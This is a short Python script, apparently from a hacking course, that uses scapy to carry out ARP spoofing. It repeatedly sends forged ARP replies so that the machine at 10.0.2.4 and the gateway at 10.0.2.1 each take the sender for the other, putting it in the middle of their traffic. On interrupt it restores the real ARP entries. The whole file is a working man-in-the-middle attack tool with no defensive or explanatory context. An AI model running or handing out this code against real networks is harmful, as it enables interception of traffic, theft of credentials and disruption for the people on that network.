#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
# end get_mac


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # ARP packet creation
    scapy.send(spoof_packet, verbose=False)
# end spoof


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,  # ARP packet creation
                               psrc=source_ip, hwsrc=source_mac)
    scapy.send(restore_packet, count=4, verbose=False)
# end restore


target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"

try:
    packet_counter = 0
    while True:
        spoof(target_ip, gateway_ip)  # Spoofing IP to appear as the router to the victim
        spoof(gateway_ip, target_ip)  # Spoofing IP to appear as the victim machine to the router
        packet_counter = packet_counter + 2
        print("\r[+] Packets sent: " + str(packet_counter)),\
            sys.stdout.flush()  # Dynamic Printing
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resetting ARP Tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
